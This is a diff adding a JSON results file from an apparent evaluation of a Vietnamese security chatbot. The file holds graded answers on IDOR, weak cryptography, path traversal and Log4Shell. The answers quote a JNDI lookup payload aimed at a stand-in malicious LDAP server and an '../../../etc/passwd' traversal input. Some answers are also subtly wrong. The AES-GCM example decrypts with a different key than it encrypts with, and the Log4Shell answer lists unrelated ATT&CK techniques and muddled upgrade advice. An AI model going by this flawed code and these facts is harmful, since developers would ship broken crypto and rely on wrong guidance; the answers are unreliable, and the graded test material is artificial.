+      "answer": "## IDOR (Insecure Direct Object Reference) là gì?\n\n**IDOR (Insecure Direct Object Reference)** – hay *lỗ hổng tham chiếu đối tượng trực tiếp không an toàn* – là một dạng lỗi bảo mật xảy ra khi ứng dụng web cho phép người dùng truy cập hoặc thao tác trên các tài nguyên (object) bằng cách thay đổi các tham số có thể đoán được (như `user_id`, `order_id`, `file_id`) mà **không thực hiện kiểm tra quyền hạn** ở cấp độ đối tượng.\n\nTheo OWASP, ba thành phần cốt lõi của IDOR bao gồm:\n1. **Một đối tượng** (tài khoản, tài liệu, vé hỗ trợ, giao dịch, hồ sơ đối tác…).\n2. **Một tham chiếu** đến đối tượng đó dưới dạng ID, UUID, số tài khoản, token hoặc slug.\n3. **Thiếu kiểm tra ủy quyền ở cấp độ đối tượng**, cho phép người dùng truy cập hoặc thao tác vào đối tượng mà lẽ ra họ không được phép.\n\nIDOR thường bị khai thác để xem, sửa hoặc xóa dữ liệu của người dùng khác, dẫn đến rò rỉ thông tin nhạy cảm, gian lận tài chính hoặc vi phạm quy định như GDPR, HIPAA.\n\n---\n\n## Cách phòng chống theo OWASP\n\nDựa trên *OWASP Insecure Direct Object Reference Prevention Cheat Sheet*, các biện pháp giảm thiểu chính bao gồm:\n\n### 1. **Thực hiện kiểm tra quyền hạn cho mọi đối tượng**\nMọi yêu cầu truy cập đối tượng đều phải xác minh người dùng hiện tại có quyền sở hữu hoặc quản lý đối tượng đó.  \n- Lấy `current_user` từ session/token.\n- So sánh với chủ sở hữu của đối tượng trong cơ sở dữ liệu.\n- Nếu không khớp → trả về lỗi 403 (Forbidden).\n\n**Ví dụ an toàn (Ruby on Rails):**\n```ruby\n# ❌ Lỗi: tìm kiếm tất cả dự án\n@project = Project.find(params[:id])\n\n# ✅ An toàn: chỉ tìm dự án thuộc về người dùng hiện tại\n@project = @current_user.projects.find(params[:id])\n```\n\n### 2. **Sử dụng tham chiếu gián tiếp (Indirect References)**\nTránh phơi bày ID trực tiếp trong URL hoặc POST body. Thay vào đó, dùng **token ngẫu nhiên, không thể đoán trước** (UUID, hash) và ánh xạ chúng đến ID thực tế phía server. Khi sử dụng luồng đa bước, hãy truyền các tham chiếu này qua session để ngăn chặn việc can thiệp.\n\n### 3. **Áp dụng kiểm tra quyền hạn có cấu trúc trong framework**\nHầu hết các framework web hiện đại (Django, Spring Security, ASP.NET Core, Ruby on Rails) đều cung cấp cơ chế kiểm tra quyền hạn. Hãy tận dụng chúng thay vì tự viết logic, đảm bảo kiểm tra được thực hiện một cách nhất quán và đáng tin cậy.\n\n### 4. **Kiểm tra quyền mỗi lần truy cập**\nKhông dựa vào kiểm tra quyền ở tầng login hay giao diện. Mỗi yêu cầu HTTP đến endpoint liên quan đến đối tượng đều phải **xác minh lại quyền** của người dùng đối với đối tượng cụ thể đó.\n\n---\n\n## Tài liệu tham khảo\n\n- **OWASP Insecure Direct Object Reference Prevention Cheat Sheet — Mitigation**  \n  URL: https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html#mitigation  \n  Giấy phép: CC BY-SA 4.0\n\n- **OWASP Insecure Direct Object Reference Prevention Cheat Sheet — Introduction**  \n  URL: https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html#introduction  \n  Giấy phép: CC BY-SA 4.0\n\nBạn cần IAS.AI hỗ trợ thêm gì nữa không?"
+    },
+    {
+      "id": "A08-crypto",
+      "owasp_ref": "OWASP Cryptographic Storage CS",
+      "label": "CWE-327 / A02:2021 Cryptographic Failures",
+      "message": "CWE-327 sử dụng thuật toán mã hóa yếu, khắc phục theo OWASP thế nào? Ví dụ code Python dùng AES-GCM.",
+      "expected_techniques": [
+        "aes",
+        "aes-gcm",
+        "aes-256",
+        "tls",
+        "tls 1.2",
+        "tls 1.3",
+        "không dùng md5",
+        "không dùng sha1",
+        "sha256",
+        "sha-256"
+      ],
+      "expected_citation": [
+        "OWASP",
+        "CWE-327"
+      ],
+      "expect_code": true,
+      "http": 200,
+      "duration_s": 12.94,
+      "grade": {
+        "tech_found": [
+          "aes",
+          "aes-gcm",
+          "tls",
+          "tls 1.2",
+          "sha-256"
+        ],
+        "tech_min_needed": 2,
+        "tech_pass": true,
+        "cit_found": [
+          "OWASP",
+          "CWE-327"
+        ],
+        "cit_pass": true,
+        "code_pass": true,
+        "overall": true
+      },
+      "answer": "## CWE-327: Sử dụng thuật toán mã hóa yếu\n\n**CWE-327** (Use of a Broken or Risky Cryptographic Algorithm) là lỗ hổng khi sản phẩm sử dụng các thuật toán hoặc giao thức mã hóa đã bị coi là không an toàn, dễ bị tấn công. Điều này có thể dẫn đến lộ thông tin nhạy cảm, thay đổi dữ liệu trái phép, giả mạo danh tính hoặc các tác động nghiêm trọng khác.\n\n### Các thuật toán mã hóa cần tránh\n- **Hashing**: MD5, SHA-1, SHA-0\n- **Đối xứng**: DES, 3DES, RC4, RC2, Blowfish (với block size nhỏ), AES-CBC (nếu không dùng đúng mode)\n- **Bất đối xứng**: RSA với độ dài khóa < 2048 bit, Diffie-Hellman với nhóm nhỏ, ECC với đường cong yếu\n- **Giao thức**: SSLv2/SSLv3, TLS 1.0, TLS 1.1, PKCS#1 v1.5 padding cho RSA\n\n### Khuyến nghị theo OWASP\nOWASP khuyến nghị sử dụng các thuật toán hiện đại và được kiểm chứng:\n- **Mã hóa đối xứng**: AES-GCM (với khóa 256-bit), ChaCha20-Poly1305\n- **Mã hóa bất đối xứng**: RSA với khóa ≥ 3072 bit, ECDSA với đường cong mạnh (P-256, P-384, Ed25519)\n- **Hashing**: SHA-256 trở lên, SHA-3, BLAKE2\n- **Giao thức**: TLS 1.2/1.3 với các bộ mã hóa mạnh\n\n### Ví dụ code Python dùng AES-GCM (an toàn)\n\n```python\nfrom Crypto.Cipher import AES\nfrom Crypto.Random import get_random_bytes\nfrom Crypto.Util.Padding import pad, unpad\nimport os\n\ndef aes_gcm_encrypt(plaintext: bytes, key: bytes = None) -> tuple[bytes, bytes, bytes]:\n    \"\"\"\n    Mã hóa AES-GCM với khóa ngẫu nhiên 256-bit.\n    Trả về: (iv, ciphertext, tag)\n    \"\"\"\n    if key is None:\n        key = get_random_bytes(32)  # 256-bit key\n    \n    iv = get_random_bytes(12)     # 96-bit IV cho GCM\n    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)\n    \n    ciphertext, tag = cipher.encrypt_and_digest(pad(plaintext, AES.block_size))\n    return iv, ciphertext, tag\n\ndef aes_gcm_decrypt(iv: bytes, ciphertext: bytes, tag: bytes, key: bytes) -> bytes:\n    \"\"\"\n    Giải mã AES-GCM.\n    \"\"\"\n    cipher = AES.new(key, AES.MODE_GCM, nonce=iv)\n    plaintext = cipher.decrypt_and_verify(ciphertext, tag)\n    return unpad(plaintext, AES.block_size)\n\n# Ví dụ sử dụng\nif __name__ == \"__main__\":\n    message = b\"Secret data\"\n    key = get_random_bytes(32)\n    \n    iv, ct, tag = aes_gcm_encrypt(message)\n    print(f\"IV: {iv.hex()}\")\n    print(f\"Ciphertext: {ct.hex()}\")\n    print(f\"Tag: {tag.hex()}\")\n    \n    decrypted = aes_gcm_decrypt(iv, ct, tag, key)\n    print(f\"Decrypted: {decrypted.decode()}\")\n```\n\n### Lưu ý quan trọng\n1. **Luôn dùng IV ngẫu nhiên** cho mỗi lần mã hóa\n2. **Kiểm tra tag** trước khi giải mã để phát hiện giả mạo\n3. **Quản lý khóa an toàn** - không hardcode key trong code\n4. **Sử dụng thư viện đã được kiểm chứng** như `cryptography` hoặc `PyCryptodome`\n5. **Cập nhật thường xuyên** các thư viện mã hóa\n\n### CVE liên quan đến CWE-327\nMột số CVE nổi bật sử dụng CWE-327:\n- **CVE-2024-30152** (HCL SX) - CVSS 9.8\n- **CVE-2024-31989** (Argo CD) - CVSS 9.0  \n- **CVE-2023-40696** (IBM Cognos Controller) - CVSS 7.5\n\nCác lỗ hổng này đều liên quan đến việc sử dụng giao thức mã hóa yếu hoặc deprecated."
+    },
+    {
+      "id": "A09-path-traversal",
+      "owasp_ref": "OWASP Path Traversal",
+      "label": "CWE-22 / Path Traversal",
+      "message": "CWE-22 Path Traversal là gì và cách vá theo OWASP? Ví dụ code Python kiểm tra đường dẫn.",
+      "expected_techniques": [
+        "realpath",
+        "canonical",
+        "abspath",
+        "resolve",
+        "os.path",
+        "pathlib",
+        "base path",
+        "chứa ../",
+        "directory traversal",
+        "path traversal"
+      ],
+      "expected_citation": [
+        "OWASP",
+        "CWE-22"
+      ],
+      "expect_code": true,
+      "http": 200,
+      "duration_s": 9.51,
+      "grade": {
+        "tech_found": [
+          "realpath",
+          "resolve",
+          "os.path",
+          "pathlib",
+          "path traversal"
+        ],
+        "tech_min_needed": 2,
+        "tech_pass": true,
+        "cit_found": [
+          "OWASP",
+          "CWE-22"
+        ],
+        "cit_pass": true,
+        "code_pass": true,
+        "overall": true
+      },
+      "answer": "## CWE-22 Path Traversal là gì?\n\n**CWE-22 – Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')** là lỗ hổng xảy ra khi ứng dụng sử dụng dữ liệu đầu vào không đáng tin cậy để xây dựng đường dẫn tệp hoặc thư mục mà không kiểm tra kỹ, cho phép kẻ tấn công vượt ra ngoài thư mục giới hạn để truy cập các tài nguyên nhạy cảm khác trên hệ thống.\n\nKẻ tấn công thường dùng các chuỗi như `../`, `..\\\\`, hoặc các biến thể mã hóa URL để \"trèo\" lên các cấp thư mục cao hơn. Hậu quả có thể bao gồm đọc/ghi trái phép tệp cấu hình, ghi đè tệp thực thi, hoặc thậm chí thực thi mã từ xa (RCE).\n\n## Cách vá theo OWASP\n\nOWASP khuyến nghị các biện pháp sau để phòng chống Path Traversal:\n\n1. **Dùng hàm chuẩn hóa đường dẫn an toàn**: Luôn gọi `os.path.realpath()` hoặc `Path.resolve()` để chuyển đổi đường dẫn về dạng tuyệt đối, sau đó kiểm tra xem nó có nằm trong thư mục đích hay không.\n2. **Áp dụng danh sách cho phép (allowlist)**: Chỉ chấp nhận các tên tệp/thư mục nằm trong một tập hợp đã định nghĩa trước.\n3. **Tránh nối chuỗi trực tiếp**: Không dùng `os.path.join()` với đầu vào người dùng mà không kiểm tra.\n4. **Sử dụng thư viện chuyên biệt**: Dùng các thư viện đã được kiểm chứng bảo mật để xử lý tệp.\n5. **Giới hạn quyền truy cập**: Chạy ứng dụng với quyền tối thiểu cần thiết (principle of least privilege).\n\n## Ví dụ code Python kiểm tra đường dẫn\n\n### ❌ Code không an toàn (dễ bị tấn công)\n\n```python\nimport os\n\ndef serve_file(user_filename):\n    base_dir = \"/var/www/html\"\n    # Lỗi: nối chuỗi trực tiếp mà không kiểm tra\n    file_path = os.path.join(base_dir, user_filename)\n    return open(file_path, 'r').read()\n```\n\n### ✅ Code an toàn (đã vá)\n\n```python\nimport os\nfrom pathlib import Path\n\ndef safe_serve_file(user_filename, base_dir=\"/var/www/html\"):\n    # Chuyển base_dir thành Path object\n    base_path = Path(base_dir).resolve()\n    \n    # Tạo đường dẫn đầy đủ từ đầu vào người dùng\n    target_path = (base_path / user_filename).resolve()\n    \n    # Kiểm tra xem target_path có nằm trong base_path không\n    try:\n        target_path.relative_to(base_path)\n    except ValueError:\n        raise ValueError(\"Access denied: path traversal detected\")\n    \n    # Nếu hợp lệ, trả về nội dung\n    return target_path.read_text()\n\n# Ví dụ sử dụng\ntry:\n    content = safe_serve_file(\"../../../etc/passwd\")\nexcept ValueError as e:\n    print(e)  # Output: Access denied: path traversal detected\n```\n\n### Giải thích:\n\n- `Path.resolve()` chuyển đổi đường dẫn về dạng tuyệt đối và giải quyết các ký tự `..`.\n- `relative_to(base_path)` sẽ ném ngoại lệ nếu `target_path` không nằm trong `base_path`.\n- Cách này ngăn chặn hoàn toàn việc truy cập ra ngoài thư mục đích.\n\nBạn cần IAS.AI hỗ trợ thêm gì nữa không?"
+    },
+    {
+      "id": "A10-log4shell",
+      "owasp_ref": "NVD CVE-2021-44228",
+      "label": "CVE-2021-44228 Log4Shell (RCE Critical)",
+      "message": "CVE-2021-44228 Log4Shell là gì và cách khắc phục?",
+      "expected_techniques": [
+        "log4j",
+        "2.17",
+        "formatmsgnolookups",
+        "jndi",
+        "cập nhật",
+        "upgrade",
+        "nâng cấp"
+      ],
+      "expected_citation": [
+        "CVE-2021-44228"
+      ],
+      "expect_code": true,
+      "http": 200,
+      "duration_s": 11.31,
+      "grade": {
+        "tech_found": [
+          "log4j",
+          "formatmsgnolookups",
+          "jndi",
+          "cập nhật",
+          "nâng cấp"
+        ],
+        "tech_min_needed": 2,
+        "tech_pass": true,
+        "cit_found": [
+          "CVE-2021-44228"
+        ],
+        "cit_pass": true,
+        "code_pass": false,
+        "overall": false
+      },
+      "answer": "## CVE-2021-44228 (Log4Shell) là gì?\n\n**CVE-2021-44228**, còn được gọi là **Log4Shell**, là một lỗ hổng bảo mật nghiêm trọng (CVSS 10.0, mức độ CRITICAL) trong Apache Log4j2, một thư viện logging phổ biến của Java. Lỗ hổng này cho phép kẻ tấn công thực thi mã tùy ý từ xa (RCE) chỉ bằng cách khiến ứng dụng ghi lại một chuỗi ký tự đặc biệt chứa payload độc hại vào log.\n\n### Cơ chế tấn công\nLỗ hổng nằm ở tính năng **JNDI Lookup** (Java Naming and Directory Interface). Khi Log4j2 xử lý các thông điệp log có chứa cú pháp `${jndi:ldap://malicious-server/payload}`, nó sẽ tự động truy vấn máy chủ LDAP do kẻ tấn công kiểm soát và tải về các lớp Java độc hại để thực thi. Điều này xảy ra ngay cả khi ứng dụng không trực tiếp tương tác với máy chủ LDAP đó.\n\n### Sản phẩm bị ảnh hưởng\nNhiều sản phẩm sử dụng Apache Log4j2 phiên bản từ **2.0-beta9 đến 2.15.0** (trừ các bản vá 2.12.2, 2.12.3, 2.3.1) đều có nguy cơ. Các sản phẩm nổi bật bao gồm:\n- Apache Finesse\n- Debian Linux\n- Mendix\n- Cisco Firepower 2120\n- Cisco Spectrum Power 4\n- Cisco SD-WAN vManage\n- Và nhiều sản phẩm khác từ các nhà cung cấp như Apple, Intel, NetApp, Siemens, SonicWall...\n\n### Cách khắc phục\n\n#### 1. Nâng cấp Log4j2 (Khuyến nghị cao nhất)\n- **Cập nhật lên phiên bản 2.16.0 trở lên**: Đây là giải pháp triệt để vì tính năng JNDI lookup đã bị loại bỏ hoàn toàn.\n- **Nếu không thể nâng cấp ngay**: Cập nhật lên ít nhất phiên bản **2.12.2, 2.12.3, hoặc 2.3.1** — các phiên bản này đã vô hiệu hóa tính năng lookup mặc định.\n- **Lưu ý**: Từ phiên bản 2.15.0 trở đi, tính năng lookup đã bị vô hiệu hóa mặc định, nhưng vẫn nên nâng cấp lên 2.16.0+ để loại bỏ hoàn toàn rủi ro.\n\n#### 2. Vô hiệu hóa tính năng JNDI Lookup (Giải pháp tạm thời)\nNếu chưa thể nâng cấp, bạn có thể vô hiệu hóa tính năng này bằng cách:\n- Đặt thuộc tính hệ thống `-Dlog4j2.formatMsgNoLookups=true` khi khởi động JVM.\n- Hoặc thêm dòng cấu hình `log4j2.formatMsgNoLookups=true` vào file `log4j2.properties`.\n\n#### 3. Kiểm tra và giám sát\n- Quét hệ thống để xác định các ứng dụng đang sử dụng Log4j2.\n- Giám sát log để phát hiện các mẫu tấn công chứa chuỗi `${jndi:`.\n- Sử dụng các công cụ như WAF (Web Application Firewall) để chặn các yêu cầu đáng ngờ.\n\n### Mã CWE liên quan\n- **CWE-20**: Improper Input Validation (Kiểm tra đầu vào không đúng)\n- **CWE-400**: Uncontrolled Resource Consumption (Tiêu thụ tài nguyên không kiểm soát)\n- **CWE-502**: Deserialization of Untrusted Data (Giải mã dữ liệu không đáng tin cậy)\n- **CWE-917**: Improper Neutralization of Special Elements used in an Expression Language Statement (Expression Language Injection)\n\n### Kỹ thuật MITRE ATT&CK liên quan\n- **T1574.006**: Hijack Execution Flow: Dynamic Linker Hijacking\n- **T1553.002**: Subvert Trust Controls: Code Signing\n- **T1574.007**: Hijack Execution Flow: Path Interception by PATH Environment Variable\n- **T1539**: Steal Web Session Cookie\n- **T1499**: Endpoint Denial of Service\n\n### Lưu ý quan trọng\n- Lỗ hổng này **chỉ ảnh hưởng đến log4j-core** và không ảnh hưởng đến log4net, log4cxx hay các dự án Apache Logging Services khác.\n- Đây là một trong những lỗ hổng nghiêm trọng nhất từng được phát hiện, được CISA đưa vào danh sách KEV (Known Exploited Vulnerabilities) — nghĩa là đang bị khai thác tích cực trên thực tế.\n\nBạn cần IAS.AI hỗ trợ thêm gì nữa không?"
+    }
+  ],
+  "part_b": [],
+  "summary": {
+    "part_a_pass": 9,
+    "part_a_total": 10,
+    "part_b_live_fetch": 0,
+    "part_b_total": 0
+  }
+}
